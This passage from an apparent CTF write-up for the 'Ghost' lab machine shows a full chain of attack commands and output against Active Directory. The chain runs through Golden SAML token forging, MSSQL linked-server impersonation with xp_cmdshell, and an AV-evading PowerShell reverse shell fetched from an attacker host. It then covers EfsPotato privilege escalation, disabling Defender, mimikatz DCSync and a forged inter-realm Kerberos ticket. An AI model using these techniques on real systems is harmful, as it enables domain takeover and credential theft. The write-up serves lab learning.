SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Nothing in our directory. Let’s login as adfs_gmsa$ account.

```bash
evil-winrm -u adfs_gmsa$ -H 8e620ff45d2a1de3fafc4c67a2c0dab4 -i DC01.ghost.htb
```

We see the same privileges as justin and no additional privileges. Let’s check the smb shares:

```bash
nxc smb ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$' --shares

SMB         10.129.8.197    445    DC01             Share           Permissions     Remark
SMB         10.129.8.197    445    DC01             -----           -----------     ------
SMB         10.129.8.197    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.8.197    445    DC01             C$                              Default share
SMB         10.129.8.197    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.8.197    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.8.197    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.8.197    445    DC01             Users           READ  
```

Nothing new.

```bash
nxc smb ghost.htb -u adfs_gmsa$ -H 8e620ff45d2a1de3fafc4c67a2c0dab4 --shares

SMB         10.129.8.197    445    DC01             Share           Permissions     Remark
SMB         10.129.8.197    445    DC01             -----           -----------     ------
SMB         10.129.8.197    445    DC01             ADMIN$                          Remote Admin
SMB         10.129.8.197    445    DC01             C$                              Default share
SMB         10.129.8.197    445    DC01             IPC$            READ            Remote IPC
SMB         10.129.8.197    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.8.197    445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.8.197    445    DC01             Users           READ 
```

Researching about the adfs account, we find an attack path; Golden SAML. 

ADFS uses a token-signing certificate to sign SAML assertions. The private key is stored encrypted in the ADFS configuration database, and the decryption key (DKM key) is stored in Active Directory. The ADFS service account has permission to read both.

Once you have:

- The DKM decryption key (from AD)
- The encrypted token-signing certificate (from ADFS config DB)

You can decrypt the private key and forge SAML tokens for any user (including Domain Admins) to any federated service (Microsoft 365, AWS,etc.).

On port 8443, we see a Ghost federation application. 

![image.png]({{ site.baseurl }}/assets/ghost/image%2027.png)

Let’s try signing in as justin

![image.png]({{ site.baseurl }}/assets/ghost/image%2028.png)

![image.png]({{ site.baseurl }}/assets/ghost/image%2029.png)

Looking at burp, the we see the SAML endpoint:

![image.png]({{ site.baseurl }}/assets/ghost/image%2030.png)

The flow:

1. User tries to access a service (e.g. Office 365)
2. Service redirects user to the IdP (ADFS)
3. User authenticates to ADFS
4. ADFS generates a SAML assertion (XML document saying "this is user X, they're in these groups") and signs it with the token-signing
certificate
5. Service validates the signature and grants access

Let’s upload ADFSDump.exe to dc01:

```bash
cd C:\programdata

upload ADFSDump.exe
```

Now execute:

```bash
.\ADFSDump.exe
```

Now copy the output back onto our host.

We need to use ADFSSpoof tool to forge SAML tokens.

Let’s download from here:

```bash
git clone https://github.com/mandiant/ADFSpoof.git
```

Note that the python version required here is python 3.11

```bash
  # 1. Install build deps                                                                                                                      
sudo apt install -y build-essential zlib1g-dev libncurses-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev wget                                                                                                                 
                                                                                                                                               
  # 2. Download and build Python 3.11                                                                                                          
  cd /tmp                                                                                                                                      
  wget https://www.python.org/ftp/python/3.11.9/Python-3.11.9.tgz                                                                              
  tar xzf Python-3.11.9.tgz                                                                                                                    
  cd Python-3.11.9                                                                                                                             
  ./configure --enable-optimizations --prefix=/usr/local/python3.11
  make -j$(nproc)
  sudo make altinstall

  # 3. Set up ADFSpoof venv
  /usr/local/python3.11/bin/python3.11 -m venv myenv
  source myenv/bin/activate
  pip install -r requirements.txt

```

Now let’s filter for the DKM; from our copied output

```bash
<SNIP>
## Extracting Private Key from Active Directory Store                                                                                          
[-] Domain is ghost.htb                                                                                                                        
[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7                               
                                                                                                                                               
                                                                                                                                               
[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1  
```

The second private key is the DKM. We want it it with no slash, and the hex string to raw binary data

```bash
echo '8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1' |  sed 's/-//g' | xxd -r -p > dkm.bin
```

Now we need the encrypted token signing key:

```bash
grep AAAAAQAA ../adfs_dump.out | base64 -d > encryptedPfx.bin
```

Now let’s run adfspoof. First we need two claim values from the AttributeStatement from SAMLResponse:

![image.png]({{ site.baseurl }}/assets/ghost/image%2031.png)

Decode the value as base64.

Now our payload:

```bash
python3 ADFSpoof.py \
  -b encryptedPfx.bin dkm.bin \
  -s federation.ghost.htb \
  saml2 \
  --endpoint "https://core.ghost.htb:8443/adfs/saml/postResponse" \
  --nameidformat "urn:oasis:names:tc:SAML:2.0:nameid-format:transient" \
  --nameid "administrator@ghost.htb" \
  --rpidentifier "https://core.ghost.htb:8443" \
  --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue>administrator@ghost.htb</AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue>administrator</AttributeValue></Attribute>'
  
%%2BPGRzOlNpZ25hdHVyZSB4bWxuczpkcz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC8wOS94bWxkc2lnIyI%2BPGRzOlNpZ25lZEluZm8%2BPGRzOkNhbm9uaWNhbGl6YXRpb25NZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxLzEwL3htbC1leGMtYzE0biMiLz48ZHM6U2lnbmF0dXJlTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxkc2lnLW1vcmUjcnNhLXNoYTI1NiIvPjxkczpSZWZlcmVuY2UgVVJJPSIjX01HTjNYViI%2BPGRzOlRyYW5zZm9ybXM%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8%2BPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMTAveG1sLWV4Yy1jMTRuIyIvPjwvZHM6VHJhbnNmb3Jtcz48ZHM6RGlnZXN0TWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjc2hhMjU2Ii8%2BPGRzOkRpZ2VzdFZhbHVlPjJxcVNYT0EzejI2czl1MlpjcTd6aFBzQjA1V2hlNkltZmlEdEhHc080OUU9PC9kczpEaWdlc3RWYWx1ZT48L2RzOlJlZmVyZW5jZT48L2RzOlNpZ25lZEluZm8%%2BPGRzOktleUluZm8%2BPGRzOlg1MDlEYXRhPjxkczpYNTA5Q2VydGlmaWNhdGU%%2BPC9kczpYNTA5RGF0YT48L2RzOktleUluZm8%2BPC9kczpTaWduYXR1cmU%2BPFN1YmplY3Q%2BPE5hbWVJRCBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OnRyYW5zaWVudCI%%2BPENvbmRpdGlvbnMgTm90QmVmb3JlPSIyMDI2LTAyLTE1VDIyOjEzOjExLjAwMFoiIE5vdE9uT3JBZnRlcj0iMjAyNi0wMi0xNVQyMzoxMzoxMS4wMDBaIj48QXVkaWVuY2VSZXN0cmljdGlvbj48QXVkaWVuY2U%2BaHR0cHM6Ly9jb3JlLmdob3N0Lmh0Yjo4NDQzPC9BdWRpZW5jZT48L0F1ZGllbmNlUmVzdHJpY3Rpb24%2BPC9Db25kaXRpb25zPjxBdHRyaWJ1dGVTdGF0ZW1lbnQ%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy91cG4iPjxBdHRyaWJ1dGVWYWx1ZT5hZG1pbmlzdHJhdG9yQGdob3N0Lmh0YjwvQXR0cmlidXRlVmFsdWU%2BPC9BdHRyaWJ1dGU%2BPEF0dHJpYnV0ZSBOYW1lPSJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy9jbGFpbXMvQ29tbW9uTmFtZSI%%2BPC9BdXRobkNvbnRleHQ%2BPC9BdXRoblN0YXRlbWVudD48L0Fzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg%3D%3D

```

Now we go back to burp, and edit the SAMLResponse.

![image.png]({{ site.baseurl }}/assets/ghost/image%2032.png)

Looks like it succeeded, since we got a redirect. Let’s copy the response in browser and visit the site:

![image.png]({{ site.baseurl }}/assets/ghost/image%2033.png)

We have Ghost Config Panel, seems like we can execute SQL queries. 

Let’s enumerate the MSSQL database:

```bash
select name from sys.databases;
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2034.png)

Only default dbs. 

Attempting to execute commands with xp_cmdshell:

```bash
 xp_cmdshell whoami
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2035.png)

Attempt to enable:

```bash
EXECUTE sp_configure 'show advanced options', 1
```

Attempt to read:

```bash
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents

RequestError: You do not have permission to use the bulk load statement.
```

Let’s see who we are:

```bash
SELECT SYSTEM_USER
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2036.png)

We are web_client. 

Let’s look for linked servers:

```bash
SELECT name, data_source, provider FROM sys.servers WHERE is_linked = 1 EXEC sp_linkedservers

{
    "recordsets": [
        [
            {
                "name": "PRIMARY",
                "data_source": "PRIMARY",
                "provider": "SQLNCLI"
            }
        ],
        [
            {
                "SRV_NAME": "DC01",
                "SRV_PROVIDERNAME": "SQLNCLI",
                "SRV_PRODUCT": "SQL Server",
                "SRV_DATASOURCE": "DC01",
                "SRV_PROVIDERSTRING": null,
                "SRV_LOCATION": null,
                "SRV_CAT": null
            },
            {
                "SRV_NAME": "PRIMARY",
                "SRV_PROVIDERNAME": "SQLNCLI",
                "SRV_PRODUCT": "SQL Server",
                "SRV_DATASOURCE": "PRIMARY",
                "SRV_PROVIDERSTRING": null,
                "SRV_LOCATION": null,
                "SRV_CAT": null
            }
        ]
    ],
    "recordset": [
        {
            "name": "PRIMARY",
            "data_source": "PRIMARY",
            "provider": "SQLNCLI"
        }
    ],
    "output": {},
    "rowsAffected": [
        1,
        2
    ]
}
```

Or like this:

```bash
SELECT srvname, isremote FROM sysservers

{
    "recordsets": [
        [
            {
                "srvname": "DC01",
                "isremote": true
            },
            {
                "srvname": "PRIMARY",
                "isremote": false
            }
        ]
    ],
    "recordset": [
        {
            "srvname": "DC01",
            "isremote": true
        },
        {
            "srvname": "PRIMARY",
            "isremote": false
        }
    ],
    "output": {},
    "rowsAffected": [
        2
    ]
}
```

Let’s see if we are sysadmin on the linked server:

```bash
SELECT * FROM OPENQUERY([PRIMARY], 'SELECT SYSTEM_USER')

{
    "recordsets": [
        [
            {
                "": "bridge_corp"
            }
        ]
    ],
    "recordset": [
        {
            "": "bridge_corp"
        }
    ],
    "output": {},
    "rowsAffected": [
        1
    ]
}
```

We are not. Let’s see if we can impersonate:

```bash
SELECT * FROM OPENQUERY([PRIMARY], 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE''')

{
    "recordsets": [
        [
            {
                "name": "sa"
            }
        ]
    ],
    "recordset": [
        {
            "name": "sa"
        }
    ],
    "output": {},
    "rowsAffected": [
        1
    ]
}
```

We can imperonsate sa.

```bash
EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''whoami'';') AT [PRIMARY]

        
            
                {
    "recordsets": [
        [
            {
                "output": "nt service\\mssqlserver"
            },
            {
                "output": null
            }
        ]
    ],
    "recordset": [
        {
            "output": "nt service\\mssqlserver"
        },
        {
            "output": null
        }
    ],
    "output": {},
    "rowsAffected": [
        2
    ]
}
            
        
```

We are nt service\\mssqlserver. Let’s execute a reverse shell.

Let’s use nishange powershell reverse shell. Encode the payload in base64:

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0


```

set up a listener:

```bash
rlwrap nc -lnvp 4444
```

Now let’s execute:

```bash
EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''powershell -enc '';') AT [PRIMARY]
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2037.png)

It seems like the AV stopped us. Let’s quickly change the variables in our payload, then try again:

```bash
iconv -t UTF-16LE shell_bypass_av.ps1 | base64 -w 0


```

Now:

```bash
EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''powershell -enc '';') AT [PRIMARY]
```

![image.png]({{ site.baseurl }}/assets/ghost/image%2038.png)

We now have shell. 

Let’s check our privileges:

```bash
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We have SeImperonatePrivilege. This privilege can be exploited by potato-styled exploits. 

Let’s check system information:

```bash
systeminfo

Host Name:                 PRIMARY                                                                                                             
OS Name:                   Microsoft Windows Server 2022 Datacenter                                                                            
OS Version:                10.0.20348 N/A Build 20348
```

Let’s use EfsPotato https://github.com/zcgonvh/EfsPotato

We download the cs script to our host and upload it. We host our python server:

```bash
python3 -m http.server 80
```

Now download it from PRIMARY host:

```bash
iwr http://10.10.16.45/EfsPotato.cs -OutFile efspotato.cs
```

Now let’s compile on the target. 

```bash
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe efspotato.cs -nowarn:1691,618
```

Now we should have a exe file. 

We can use the same powershell reverseshell script to receive a shell:

```bash
nc -lnpv 4444
```

Now execute:

```bash
.\efspotato.exe "powershell IEX(iwr -UseBasicParsing http://10.10.16.45/shell_bypass_av.ps1)"
```

We now have SYSTEM shell:

![image.png]({{ site.baseurl }}/assets/ghost/image%2039.png)

Enumerating Administrator’s folder, we did not find anything useful. Checking our current domain:

```bash
(Get-WmiObject Win32_ComputerSystem).Domain
corp.ghost.htb
```

We are on another domain here. 

Let’s turn off Microsoft protections so we can freely enumerate and use our tools. 

```bash
Set-MpPreference -DisableRealTimeMonitoring $True
```

Let’s check the domain trust:

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.16.45/PowerView.ps1')

Get-DomainTrustMapping

SourceName      : corp.ghost.htb
TargetName      : ghost.htb
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 2/1/2024 2:33:33 AM
WhenChanged     : 2/18/2026 4:31:31 PM

SourceName      : ghost.htb
TargetName      : corp.ghost.htb
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 2/1/2024 2:33:33 AM
WhenChanged     : 2/18/2026 4:31:31 PM

```

We have bidirectional trust with the root domain. Let’s first dcsync our current domain

```bash
iwr http://10.10.16.45/mimikatz.exe -OutFile m.exe

.\m.exe 'lsadump::dcsync /all /csv' exit > output

type output

mimikatz(commandline) # lsadump::dcsync /all /csv
[DC] 'corp.ghost.htb' will be the domain
[DC] 'PRIMARY.corp.ghost.htb' will be the DC server
[DC] Exporting domain 'corp.ghost.htb'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  69eb46aa347a8c68edb99be2725403ab        514
500     Administrator   41515af3ada195029708a53d941ab751        512
1000    PRIMARY$        27f92da5e3d79962020ddebc08ed7d70        532480
1103    GHOST$  22ad09a30f7437ad5b3150cda9704623        2080

mimikatz(commandline) # exit
Bye!

```

We can use the GHOST$ NT hash to forge an inter-realm referral ticket

What we need:

1. the NT hash for the trust account
2. The SID for the child domain
3. The name of a target user in the child domain (does not need to exist!)
4. The FQDN of the child domain.
5. The SID of the Enterprise Admins group of the root domain.

```bash
#1. GHOST$ trusted interdomain key
22ad09a30f7437ad5b3150cda9704623

#2. SID of child domain
Get-DomainSID
S-1-5-21-2034262909-2733679486-179904498
**[**
#3. name of target user
Administrator

#4. FQDN of child domain
corp.ghost.htb

#5. SID of enterprise admin on parent domain, check in bloodhound
S-1-5-21-4084500788-938703357-3654145966-519
```

Now let’s craft our referral ticket:

```bash
impacket-ticketer -nthash 22ad09a30f7437ad5b3150cda9704623 -domain-sid S-1-5-21-2034262909-2733679486-179904498 -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -spn krbtgt/ghost.htb -domain corp.ghost.htb Administrator 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for corp.ghost.htb/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

- Without -spn → golden ticket → only valid for corp.ghost.htb (child domain), useless for parent
- With -spn krbtgt/ghost.htb → inter-realm referral ticket → valid for crossing into ghost.htb (parent domain)

Now let’s request cifs service ticket for dc01 as enterprise admin with getST; The parent DC sees Enterprise Admins in the PAC, says "looks good," and issues the service ticket.

```bash
export KRB5CCNAME=Administrator.ccache

impacket-getST -k -no-pass -spn cifs/dc01.ghost.htb ghost.htb/Administrator@ghost.htb 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in Administrator@ghost.htb@cifs_dc01.ghost.htb@GHOST.HTB.ccache

```

This takes the referral ticket to the parent domain and says "give me a service ticket for CIFS on DC01." The parent DC checks the trust, sees Enterprise Admins in the PAC, and issues the ticket.

Let’s export ticket and test it out:

```bash
export KRB5CCNAME='Administrator@ghost.htb@cifs_dc01.ghost.htb@GHOST.HTB.ccache'

nxc smb ghost.htb --use-kcache

SMB         ghost.htb       445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:ghost.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         ghost.htb       445    DC01             [+] CORP.GHOST.HTB\Administrator from ccache (Pwn3d!)

```

We are now have dcsync rights on DC01.

Let’s DCSync now:

```bash
impacket-secretsdump -k -no-pass -just-dc administrator@dc01.ghost.htb

<SNIP>
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cdb17d5c14ff69e7067cffcc9e470bd:::
```

Let’s winrm onto dc01 and get the flag:

```bash
evil-winrm -u Administrator -H 1cdb17d5c14ff69e7067cffcc9e470bd -i ghost.htb
```
